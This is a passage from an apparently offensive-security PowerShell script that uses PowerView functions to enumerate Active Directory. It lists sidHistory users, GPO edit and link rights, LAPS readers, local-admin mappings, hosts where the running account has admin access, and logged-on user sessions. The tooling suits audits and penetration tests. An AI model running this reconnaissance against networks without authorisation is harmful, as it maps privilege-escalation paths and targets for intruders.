	}
	
	##########################################
    ########### sidHistory set ###############
	##########################################

    Write-Host ""
	Write-Host "Users with sidHistory set:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$sidHistoryUsers = Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter '(sidHistory=*)'
		$TempsidHistoryUsers = foreach ($sidHistoryUser in $sidHistoryUsers) {
			[PSCustomObject]@{
				"samaccountname" = $sidHistoryUser.samaccountname
				"Enabled" = if ($sidHistoryUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($sidHistoryUser.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Adm" = if ($sidHistoryUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				"DA" = if ($sidHistoryUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				"EA" = if ($sidHistoryUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $sidHistoryUser.lastlogontimestamp
				"SID" = $sidHistoryUser.objectSID
				"Domain" = $Domain
			}
		}

		if ($TempsidHistoryUsers) {
			$TempsidHistoryUsers | Format-Table -AutoSize -Wrap
			$HTMLsidHistoryUsers = $TempsidHistoryUsers | ConvertTo-Html -Fragment -PreContent "<h2>Users with sidHistory set</h2>"
		}
	}
	else {
		$TempsidHistoryUsers = foreach ($AllDomain in $AllDomains) {
			$sidHistoryUsers = Get-DomainUser -Domain $AllDomain -LDAPFilter '(sidHistory=*)'
			foreach ($sidHistoryUser in $sidHistoryUsers) {
				[PSCustomObject]@{
					"samaccountname" = $sidHistoryUser.samaccountname
					"Enabled" = if ($sidHistoryUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($sidHistoryUser.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($sidHistoryUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($sidHistoryUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($sidHistoryUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $sidHistoryUser.lastlogontimestamp
					"SID" = $sidHistoryUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}

		if ($TempsidHistoryUsers) {
			$TempsidHistoryUsers | Format-Table -AutoSize -Wrap
			$HTMLsidHistoryUsers = $TempsidHistoryUsers | ConvertTo-Html -Fragment -PreContent "<h2>Users with sidHistory set</h2>"
		}
	}
	
	#######################################
    ########### GPO Rights ################
	#######################################
	
	if($NoGPOs){}
    else{
        
        Write-Host ""
		Write-Host "Who can create GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$dcName = "dc=" + $Domain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			$GPOCreators = Get-DomainObjectAcl -Domain $Domain -Server $Server -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier -Domain $Domain -Server $Server }
			$TempGPOCreators = foreach ($GPOCreator in $GPOCreators) {
				[PSCustomObject]@{
					"Account" = $GPOCreator
					"Domain" = $Domain
				}
			}
		}
		else {
			$TempGPOCreators = foreach ($AllDomain in $AllDomains) {
				$dcName = "dc=" + $AllDomain.Split(".")
				$dcName = $dcName -replace " ", ",dc="
				$GPOCreators = Get-DomainObjectAcl -Domain $AllDomain -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier -Domain $AllDomain }
				foreach ($GPOCreator in $GPOCreators) {
					[PSCustomObject]@{
						"Account" = $GPOCreator
						"Domain" = $AllDomain
					}
				}
			}
		}

		if ($TempGPOCreators) {
			$TempGPOCreators | Format-Table -AutoSize -Wrap
			$HTMLGPOCreators = $TempGPOCreators | ConvertTo-Html -Fragment -PreContent "<h2>Who can create GPOs</h2>"
		}


        Write-Host ""
        Write-Host "Who can modify existing GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$jSIDdomain = Get-DomainSID -Domain $Domain -Server $Server

			$jGPOIDRAW = (Get-DomainGPO -Domain $Domain -Server $Server | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })

			$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)

			if ($jGPOIDRAW) {
				$TempGPOsWhocanmodify = foreach ($jGPOID in $jGPOIDs) {
					$jGPOIDSELECTs = ($jGPOIDRAW | ? { $_.ObjectDN -eq $jGPOID } | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
					$TargetsWhoCanEdit = foreach ($jGPOIDSELECT in $jGPOIDSELECTs) {
						$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT")
						$objUser = $SID.Translate([System.Security.Principal.NTAccount])
						$objUser.Value
					}
					
					$TempPolicyInfo = Get-DomainGPO -Domain $Domain -Server $Server -Identity $jGPOID

					[PSCustomObject]@{
						"Who can edit" = $TargetsWhoCanEdit -Join " - "
						"Policy Name" = $TempPolicyInfo.displayName
						"Policy Path" = $TempPolicyInfo.gpcFileSysPath
						"OUs the policy applies to" = (Get-DomainOU -Domain $Domain -Server $Server -GPLink "$jGPOID").name -Join " - "
					}
				}

				if ($TempGPOsWhocanmodify) {
					$TempGPOsWhocanmodify | Format-Table -AutoSize -Wrap
					$HTMLGPOsWhocanmodify = $TempGPOsWhocanmodify | ConvertTo-Html -Fragment -PreContent "<h2>Who can modify existing GPOs</h2>"
				}
			}
		}
		else {
			$TempGPOsWhocanmodify = foreach ($AllDomain in $AllDomains) {
				$jSIDdomain = Get-DomainSID -Domain $AllDomain

				$jGPOIDRAW = (Get-DomainGPO -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })

				$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)

				if ($jGPOIDRAW) {
					foreach ($jGPOID in $jGPOIDs) {
						$jGPOIDSELECTs = ($jGPOIDRAW | ? { $_.ObjectDN -eq $jGPOID } | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
						$TargetsWhoCanEdit = foreach ($jGPOIDSELECT in $jGPOIDSELECTs) {
							$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT")
							$objUser = $SID.Translate([System.Security.Principal.NTAccount])
							$objUser.Value
						}
						
						$TempPolicyInfo = Get-DomainGPO -Domain $AllDomain -Identity $jGPOID

						[PSCustomObject]@{
							"Who can edit" = $TargetsWhoCanEdit -Join " - "
							"Policy Name" = $TempPolicyInfo.displayName
							"Policy Path" = $TempPolicyInfo.gpcFileSysPath
							"OUs the policy applies to" = (Get-DomainOU -Domain $AllDomain -GPLink "$jGPOID").name -Join " - "
						}
					}
				}
			}

			if ($TempGPOsWhocanmodify) {
				$TempGPOsWhocanmodify | Format-Table -AutoSize -Wrap
				$HTMLGPOsWhocanmodify = $TempGPOsWhocanmodify | ConvertTo-Html -Fragment -PreContent "<h2>Who can modify existing GPOs</h2>"
			}
		}


        Write-Host ""
		Write-Host "Who can link GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$gpolinkresult = (Get-DomainOU -Domain $Domain -Server $Server | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
			$TempGpoLinkResults = foreach ($result in $gpolinkresult) {
				[PSCustomObject]@{
					"Who can link" = (ConvertFrom-SID -Domain $Domain -Server $Server $result.SecurityIdentifier)
					"SecurityIdentifier" = $result.SecurityIdentifier
					"ObjectDN" = $result.ObjectDN
					"ActiveDirectoryRights" = $result.ActiveDirectoryRights
					"ObjectAceType" = $result.ObjectAceType
				}
			}

			if ($TempGpoLinkResults) {
				$TempGpoLinkResults | Format-Table -AutoSize -Wrap
				$HTMLGpoLinkResults = $TempGpoLinkResults | ConvertTo-Html -Fragment -PreContent "<h2>Who can link GPOs</h2>"
			}
		}
		else {
			$TempGpoLinkResults = foreach ($AllDomain in $AllDomains) {
				$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
				foreach ($result in $gpolinkresult) {
					[PSCustomObject]@{
						"Who can link" = (ConvertFrom-SID -Domain $AllDomain $result.SecurityIdentifier)
						"SecurityIdentifier" = $result.SecurityIdentifier
						"ObjectDN" = $result.ObjectDN
						"ActiveDirectoryRights" = $result.ActiveDirectoryRights
						"ObjectAceType" = $result.ObjectAceType
					}
				}
			}

			if ($TempGpoLinkResults) {
				$TempGpoLinkResults | Format-Table -AutoSize -Wrap
				$HTMLGpoLinkResults = $TempGpoLinkResults | ConvertTo-Html -Fragment -PreContent "<h2>Who can link GPOs</h2>"
			}
		}

    }
	
	#####################################
    ########### LAPS GPOs ###############
	#####################################

	if($NoLAPS){}
	else{
		Write-Host ""
		Write-Host "LAPS GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LAPSGPOs = Get-DomainGPO -Domain $Domain -Server $Server | Where-Object { $_.DisplayName -like "*laps*" }
			$TempLAPSGPOs = foreach ($LAPSGPO in $LAPSGPOs) {
				
				$LAPSGPOLocation = $LAPSGPO | select-object -ExpandProperty GPCFileSysPath
				
				foreach($LAPSGPOLoc in $LAPSGPOLocation){
					$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
					$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
					$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
					$splitString = ($splitString | Out-String) -split "`n"
					$splitString = $splitString.Trim()
					$splitString = $splitString | Where-Object { $_ -ne "" }
					$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
					$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
					if ($adminAccountRow) {
						$LAPSAdminresult = ($adminAccountRow -split ';')[4]
					}
				}
				
				[PSCustomObject]@{
					"GPO Name" = $LAPSGPO.DisplayName
					"Path Name" = $LAPSGPO.Name
					"LAPS Admin" = $LAPSAdminresult
					"GPC File Sys Path" = $LAPSGPO.GPCFileSysPath
				}
				
				$LAPSAdminresult = $null
				$LAPSGPOLocation = $null
				$inputString = $null
				$splitString = $null
			}

			if ($TempLAPSGPOs) {
				$TempLAPSGPOs | Format-Table -AutoSize -Wrap
				$HTMLLAPSGPOs = $TempLAPSGPOs | ConvertTo-Html -Fragment -PreContent "<h2>LAPS GPOs</h2>"
			}
		}
		else {
			$TempLAPSGPOs = foreach ($AllDomain in $AllDomains) {
				$LAPSGPOs = Get-DomainGPO -Domain $AllDomain | Where-Object { $_.DisplayName -like "*laps*" }
				foreach ($LAPSGPO in $LAPSGPOs) {
					
					$LAPSGPOLocation = $LAPSGPO | select-object -ExpandProperty GPCFileSysPath
				
					foreach($LAPSGPOLoc in $LAPSGPOLocation){
						$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
						$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
						$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
						$splitString = ($splitString | Out-String) -split "`n"
						$splitString = $splitString.Trim()
						$splitString = $splitString | Where-Object { $_ -ne "" }
						$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
						$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
						if ($adminAccountRow) {
							$LAPSAdminresult = ($adminAccountRow -split ';')[4]
						}
					}
					
					[PSCustomObject]@{
						"GPO Name" = $LAPSGPO.DisplayName
						"Path Name" = $LAPSGPO.Name
						"LAPS Admin" = $LAPSAdminresult
						"GPC File Sys Path" = $LAPSGPO.GPCFileSysPath
					}
					
					$LAPSAdminresult = $null
					$LAPSGPOLocation = $null
					$inputString = $null
					$splitString = $null
				}
			}

			if ($TempLAPSGPOs) {
				$TempLAPSGPOs | Format-Table -AutoSize -Wrap
				$HTMLLAPSGPOs = $TempLAPSGPOs | ConvertTo-Html -Fragment -PreContent "<h2>LAPS GPOs</h2>"
			}
		}

		Write-Host ""
		Write-Host "Who can read LAPS:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LAPSCanReads = Get-DomainComputer -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" }
			$TempLAPSCanRead = foreach ($LAPSCanRead in $LAPSCanReads) {
				[PSCustomObject]@{
					"Delegated Groups" = (ConvertFrom-SID $LAPSCanRead.SecurityIdentifier -Domain $Domain -Server $Server)
					"ObjectDn" = $LAPSCanRead.ObjectDN
				}
			}

			if ($TempLAPSCanRead) {
				$TempLAPSCanRead | Format-Table -AutoSize -Wrap
				$HTMLLAPSCanRead = $TempLAPSCanRead | ConvertTo-Html -Fragment -PreContent "<h2>Who can read LAPS</h2>"
			}
		}
		else {
			$TempLAPSCanRead = foreach ($AllDomain in $AllDomains) {
				$LAPSCanReads = Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" }
				foreach ($LAPSCanRead in $LAPSCanReads) {
					[PSCustomObject]@{
						"Delegated Groups" = (ConvertFrom-SID $LAPSCanRead.SecurityIdentifier -Domain $AllDomain)
						"ObjectDn" = $LAPSCanRead.ObjectDN
					}
				}
			}

			if ($TempLAPSCanRead) {
				$TempLAPSCanRead | Format-Table -AutoSize -Wrap
				$HTMLLAPSCanRead = $TempLAPSCanRead | ConvertTo-Html -Fragment -PreContent "<h2>Who can read LAPS</h2>"
			}
		}

		Write-Host ""
		Write-Host "Computer objects where LAPS is enabled:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LapsEnabledComputers = Get-DomainComputer -Domain $Domain -Server $Server | Where-Object { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null }
			$TempLapsEnabledComputers = foreach ($LapsEnabledComputer in $LapsEnabledComputers) {
				[PSCustomObject]@{
					"Name" = $LapsEnabledComputer.samaccountname
					"IP Address" = Resolve-DnsName -Name $LapsEnabledComputer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Account SID" = $LapsEnabledComputer.objectsid
					Domain = $Domain
				}
			}

			if ($TempLapsEnabledComputers) {
				$TempLapsEnabledComputers | Format-Table -AutoSize -Wrap
				$HTMLLapsEnabledComputers = $TempLapsEnabledComputers | ConvertTo-Html -Fragment -PreContent "<h2>Computer objects where LAPS is enabled</h2>"
			}
		}
		else {
			$TempLapsEnabledComputers = foreach ($AllDomain in $AllDomains) {
				$LapsEnabledComputers = Get-DomainComputer -Domain $AllDomain | Where-Object { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null }
				foreach ($LapsEnabledComputer in $LapsEnabledComputers) {
					[PSCustomObject]@{
						"Name" = $LapsEnabledComputer.samaccountname
						"IP Address" = Resolve-DnsName -Name $LapsEnabledComputer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
						"Account SID" = $LapsEnabledComputer.objectsid
						Domain = $AllDomain
					}
				}
			}

			if ($TempLapsEnabledComputers) {
				$TempLapsEnabledComputers | Format-Table -AutoSize -Wrap
				$HTMLLapsEnabledComputers = $TempLapsEnabledComputers | ConvertTo-Html -Fragment -PreContent "<h2>Computer objects where LAPS is enabled</h2>"
			}
		}
	}
	
	##########################################
    ########### AppLocker GPOs ###############
	##########################################
    
	if($NoAppLocker){}
	else{
		Write-Host ""
		Write-Host "AppLocker GPOs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$AppLockerGPOs = Get-DomainGPO -Domain $Domain -Server $Server | Where-Object { $_.DisplayName -like "*AppLocker*" }
			$TempAppLockerGPOs = foreach ($AppLockerGPO in $AppLockerGPOs) {
				[PSCustomObject]@{
					"Display Name" = $AppLockerGPO.DisplayName
					"GPC File Sys Path" = $AppLockerGPO.GPCFileSysPath
				}
			}

			if ($TempAppLockerGPOs) {
				$TempAppLockerGPOs | Format-Table -AutoSize -Wrap
				$HTMLAppLockerGPOs = $TempAppLockerGPOs | ConvertTo-Html -Fragment -PreContent "<h2>AppLocker GPOs</h2>"
			}
		}
		
		else {
			$TempAppLockerGPOs = foreach ($AllDomain in $AllDomains) {
				$AppLockerGPOs = Get-DomainGPO -Domain $AllDomain | Where-Object { $_.DisplayName -like "*AppLocker*" }
				foreach ($AppLockerGPO in $AppLockerGPOs) {
					[PSCustomObject]@{
						"Display Name" = $AppLockerGPO.DisplayName
						"GPC File Sys Path" = $AppLockerGPO.GPCFileSysPath
					}
				}
			}

			if ($TempAppLockerGPOs) {
				$TempAppLockerGPOs | Format-Table -AutoSize -Wrap
				$HTMLAppLockerGPOs = $TempAppLockerGPOs | ConvertTo-Html -Fragment -PreContent "<h2>AppLocker GPOs</h2>"
			}
		}
	}
	
	####################################################################
    ########### GPOs that modify local group memberships ###############
	####################################################################
	
	if(!$MoreGPOs){}
    else{
        Write-Host ""
		Write-Host "GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$GPOLocalGroups = Get-DomainGPOLocalGroup -Domain $Domain -Server $Server
			$TempGPOLocalGroupsMembership = foreach ($GPOLocalGroup in $GPOLocalGroups) {
				[PSCustomObject]@{
					"GPO Display Name" = $GPOLocalGroup.GPODisplayName
					"Group Name" = $GPOLocalGroup.GroupName
				}
			}

			if ($TempGPOLocalGroupsMembership) {
				$TempGPOLocalGroupsMembership | Format-Table -AutoSize -Wrap
				$HTMLGPOLocalGroupsMembership = $TempGPOLocalGroupsMembership | ConvertTo-Html -Fragment -PreContent "<h2>GPOs that modify local group memberships</h2>"
			}
		}
		else {
			$TempGPOLocalGroupsMembership = foreach ($AllDomain in $AllDomains) {
				$GPOLocalGroups = Get-DomainGPOLocalGroup -Domain $AllDomain
				foreach ($GPOLocalGroup in $GPOLocalGroups) {
					[PSCustomObject]@{
						"GPO Display Name" = $GPOLocalGroup.GPODisplayName
						"Group Name" = $GPOLocalGroup.GroupName
					}
				}
			}

			if ($TempGPOLocalGroupsMembership) {
				$TempGPOLocalGroupsMembership | Format-Table -AutoSize -Wrap
				$HTMLGPOLocalGroupsMembership = $TempGPOLocalGroupsMembership | ConvertTo-Html -Fragment -PreContent "<h2>GPOs that modify local group memberships</h2>"
			}
		}
    }
	
	###################################################################################
    ########### Users which are in a local group of a machine using GPO ###############
	###################################################################################
	
	if(!$MoreGPOs){}
    else{
        Write-Host ""
		Write-Host "Users which are in a local group of a machine using GPO:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$GPOComputerAdmins = Get-DomainComputer -Domain $Domain -Server $Server | Find-GPOComputerAdmin -Domain $Domain -Server $Server
			$TempGPOComputerAdmins = foreach ($GPOComputerAdmin in $GPOComputerAdmins) {
				[PSCustomObject]@{
					"Computer Name" = $GPOComputerAdmin.ComputerName
					"Object Name" = $GPOComputerAdmin.ObjectName
					"Object SID" = $GPOComputerAdmin.ObjectSID
					"Is Group" = $GPOComputerAdmin.IsGroup
					"GPO Display Name" = $GPOComputerAdmin.GPODisplayName
					"GPO Path" = $GPOComputerAdmin.GPOPath
				}
			}

			if ($TempGPOComputerAdmins) {
				$TempGPOComputerAdmins | Format-Table -AutoSize -Wrap
				$HTMLGPOComputerAdmins = $TempGPOComputerAdmins | ConvertTo-Html -Fragment -PreContent "<h2>Users which are in a local group of a machine using GPO</h2>"
			}
		}
		else {
			$TempGPOComputerAdmins = foreach ($AllDomain in $AllDomains) {
				$GPOComputerAdmins = Get-DomainComputer -Domain $AllDomain | Find-GPOComputerAdmin -Domain $AllDomain
				foreach ($GPOComputerAdmin in $GPOComputerAdmins) {
					[PSCustomObject]@{
						"Computer Name" = $GPOComputerAdmin.ComputerName
						"Object Name" = $GPOComputerAdmin.ObjectName
						"Object SID" = $GPOComputerAdmin.ObjectSID
						"Is Group" = $GPOComputerAdmin.IsGroup
						"GPO Display Name" = $GPOComputerAdmin.GPODisplayName
						"GPO Path" = $GPOComputerAdmin.GPOPath
					}
				}
			}

			if ($TempGPOComputerAdmins) {
				$TempGPOComputerAdmins | Format-Table -AutoSize -Wrap
				$HTMLGPOComputerAdmins = $TempGPOComputerAdmins | ConvertTo-Html -Fragment -PreContent "<h2>Users which are in a local group of a machine using GPO</h2>"
			}
		}
    }
	
	#####################################################################################################################
    ########### Machines where a specific domain user/group is a member of the Administrators local group ###############
	#####################################################################################################################
	
	if(!$MoreGPOs){}
	else{
		Write-Host ""
		Write-Host "Machines where a specific domain user/group is a member of the Administrators local group:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$GPOMappings = Get-DomainGPOUserLocalGroupMapping -Domain $Domain -Server $Server -LocalGroup Administrators
			$TempGPOMachinesAdminlocalgroup = foreach ($GPOMapping in $GPOMappings) {
				[PSCustomObject]@{
					"Object Name" = $GPOMapping.ObjectName
					"GPO Display Name" = $GPOMapping.GPODisplayName
					"Container Name" = $GPOMapping.ContainerName
					"Computer Name" = $GPOMapping.ComputerName
				}
			}

			if ($TempGPOMachinesAdminlocalgroup) {
				$TempGPOMachinesAdminlocalgroup | Format-Table -AutoSize -Wrap
				$HTMLGPOMachinesAdminlocalgroup = $TempGPOMachinesAdminlocalgroup | ConvertTo-Html -Fragment -PreContent "<h2>Machines where a specific domain user/group is a member of the Administrators local group</h2>"
			}
		}
		else {
			$TempGPOMachinesAdminlocalgroup = foreach ($AllDomain in $AllDomains) {
				$GPOMappings = Get-DomainGPOUserLocalGroupMapping -Domain $AllDomain -LocalGroup Administrators
				foreach ($GPOMapping in $GPOMappings) {
					[PSCustomObject]@{
						"Object Name" = $GPOMapping.ObjectName
						"GPO Display Name" = $GPOMapping.GPODisplayName
						"Container Name" = $GPOMapping.ContainerName
						"Computer Name" = $GPOMapping.ComputerName
					}
				}
			}

			if ($TempGPOMachinesAdminlocalgroup) {
				$TempGPOMachinesAdminlocalgroup | Format-Table -AutoSize -Wrap
				$HTMLGPOMachinesAdminlocalgroup = $TempGPOMachinesAdminlocalgroup | ConvertTo-Html -Fragment -PreContent "<h2>Machines where a specific domain user/group is a member of the Administrators local group</h2>"
			}
		}
	}
		
	###############################################################################
    ########### Machines where a user is member of a specific group ###############
	###############################################################################
	
	if(!$MoreGPOs){}
	else{
		Write-Host ""
		Write-Host "Machines where a user is a member of a specific group:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$usersInGroup = Get-DomainUser -Domain $Domain -Server $Server | Find-GPOLocation -Domain $Domain -Server $Server
			$TempUsersInGroup = foreach ($userInGroup in $usersInGroup) {
				[PSCustomObject]@{
					"Object Name" = $userInGroup.ObjectName
					"Object SID" = $userInGroup.ObjectSID
					"Domain" = $userInGroup.Domain
					"Is Group" = $userInGroup.IsGroup
					"GPO Display Name" = $userInGroup.GPODisplayName
					"GPO Path" = $userInGroup.GPOPath
				}
			}

			if ($TempUsersInGroup) {
				$TempUsersInGroup | Format-Table -AutoSize -Wrap
				$HTMLUsersInGroup = $TempUsersInGroup | ConvertTo-Html -Fragment -PreContent "<h2>Machines where a user is a member of a specific group</h2>"
			}
		}
		else {
			$TempUsersInGroup = foreach ($AllDomain in $AllDomains) {
				$usersInGroup = Get-DomainUser -Domain $AllDomain | Find-GPOLocation
				foreach ($userInGroup in $usersInGroup) {
					[PSCustomObject]@{
						"Object Name" = $userInGroup.ObjectName
						"Object SID" = $userInGroup.ObjectSID
						"Domain" = $userInGroup.Domain
						"Is Group" = $userInGroup.IsGroup
						"GPO Display Name" = $userInGroup.GPODisplayName
						"GPO Path" = $userInGroup.GPOPath
					}
				}
			}

			if ($TempUsersInGroup) {
				$TempUsersInGroup | Format-Table -AutoSize -Wrap
				$HTMLUsersInGroup = $TempUsersInGroup | ConvertTo-Html -Fragment -PreContent "<h2>Machines where a user is a member of a specific group</h2>"
			}
		}

	}
	
	#################################################
    ######### Find Local Admin Access ###############
	#################################################
	
	if(!$FindLocalAdminAccess){}
    else{
        Write-Host ""
		Write-Host "Find Local Admin Access:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LocalAdminAccess = Find-LocalAdminAccess -Server $Server -CheckShareAccess -Threads 100 -Delay 1
			$TempFindLocalAdminAccess = foreach ($AdminAccess in $LocalAdminAccess) {
				[PSCustomObject]@{
					"Target" = $AdminAccess
					"IP Address" = (Resolve-DnsName -Name $AdminAccess -Type A).IPAddress
					"Operating System" = Get-DomainComputer -Domain $Domain -Server $Server -Identity $AdminAccess | Select-Object -ExpandProperty operatingsystem
					"Domain" = $Domain
				}
			}

			if ($TempFindLocalAdminAccess) {
				$TempFindLocalAdminAccess | Format-Table -AutoSize -Wrap
				$HTMLFindLocalAdminAccess = $TempFindLocalAdminAccess | ConvertTo-Html -Fragment -PreContent "<h2>Local Admin Access</h2>"
			}
		}
		else {
			$TempFindLocalAdminAccess = foreach ($AllDomain in $AllDomains) {
				$LocalAdminAccess = Find-LocalAdminAccess -Domain $AllDomain -CheckShareAccess -Threads 100 -Delay 1
				foreach ($AdminAccess in $LocalAdminAccess) {
					[PSCustomObject]@{
						"Target" = $AdminAccess
						"IP Address" = (Resolve-DnsName -Name $AdminAccess -Type A).IPAddress
						"Operating System" = Get-DomainComputer -Domain $AllDomain -Identity $AdminAccess | Select-Object -ExpandProperty operatingsystem
						"Domain" = $AllDomain
					}
				}
			}

			if ($TempFindLocalAdminAccess) {
				$TempFindLocalAdminAccess | Format-Table -AutoSize -Wrap
				$HTMLFindLocalAdminAccess = $TempFindLocalAdminAccess | ConvertTo-Html -Fragment -PreContent "<h2>Local Admin Access</h2>"
			}
		}
    }
	
	###################################################
    ######### Find Domain User Location ###############
	###################################################
    
    if(!$FindDomainUserLocation){}
    else{
        Write-Host ""
		Write-Host "Find Domain User Location:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$UserLocations = Find-DomainUserLocation -Domain $Domain -Server $Server -Delay 1
			$TempFindDomainUserLocation = foreach ($UserLocation in $UserLocations) {
				[PSCustomObject]@{
					"UserName" = $UserLocation.UserName
					"User Domain" = $UserLocation.UserDomain
					"Computer Name" = $UserLocation.ComputerName
					"IP Address" = $UserLocation.IPAddress
					"Operating System" = Get-DomainComputer -Identity $UserLocation.ComputerName | Select-Object -ExpandProperty operatingsystem
					"Session From" = $UserLocation.SessionFrom
					"Session From Name" = $UserLocation.SessionFromName
					"Local Admin" = $UserLocation.LocalAdmin
				}
			}

			if ($TempFindDomainUserLocation) {
				$TempFindDomainUserLocation | Format-Table -AutoSize -Wrap
				$HTMLFindDomainUserLocation = $TempFindDomainUserLocation | ConvertTo-Html -Fragment -PreContent "<h2>Find Domain User Location</h2>"
			}
		}
		else {
			$TempFindDomainUserLocation = foreach ($AllDomain in $AllDomains) {
				$UserLocations = Find-DomainUserLocation -Domain $AllDomain -Delay 1
				foreach ($UserLocation in $UserLocations) {
					[PSCustomObject]@{
						"UserName" = $UserLocation.UserName
						"User Domain" = $UserLocation.UserDomain
						"Computer Name" = $UserLocation.ComputerName
						"IP Address" = $UserLocation.IPAddress
						"Operating System" = Get-DomainComputer -Identity $UserLocation.ComputerName | Select-Object -ExpandProperty operatingsystem
						"Session From" = $UserLocation.SessionFrom
						"Session From Name" = $UserLocation.SessionFromName
						"Local Admin" = $UserLocation.LocalAdmin
					}
				}
			}

			if ($TempFindDomainUserLocation) {
				$TempFindDomainUserLocation | Format-Table -AutoSize -Wrap
				$HTMLFindDomainUserLocation = $TempFindDomainUserLocation | ConvertTo-Html -Fragment -PreContent "<h2>Find Domain User Location</h2>"
			}
		}

    }
	
	###########################################################################
    ######### Logged on users for all machines in any Server OU ###############
	###########################################################################
	
	if(!$MoreOUs){}
	else{
		Write-Host ""
		Write-Host "Logged on users for all machines in any Server OU:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LoggedOnUsersServerOU = Get-DomainOU -Identity *server* -Domain $Domain -Server $Server | %{Get-DomainComputer -Domain $Domain -Server $Server -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -Domain $Domain -Server $Server -ComputerName $_}}
			
			$TempLoggedOnUsersServerOU = foreach ($LoggedOnUser in $LoggedOnUsersServerOU) {
				[PSCustomObject]@{
					"User" = $LoggedOnUser.User
					"Domain" = $Domain
				}
			}

			if ($TempLoggedOnUsersServerOU) {
				$TempLoggedOnUsersServerOU | Format-Table -AutoSize -Wrap
				$HTMLLoggedOnUsersServerOU = $TempLoggedOnUsersServerOU | ConvertTo-Html -Fragment -PreContent "<h2>Logged on users for all machines in any Server OU</h2>"
			}
		}
		else {
			foreach ($AllDomain in $AllDomains) {
				$LoggedOnUsersServerOU = Get-DomainOU -Identity *server* -Domain $AllDomain | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
				
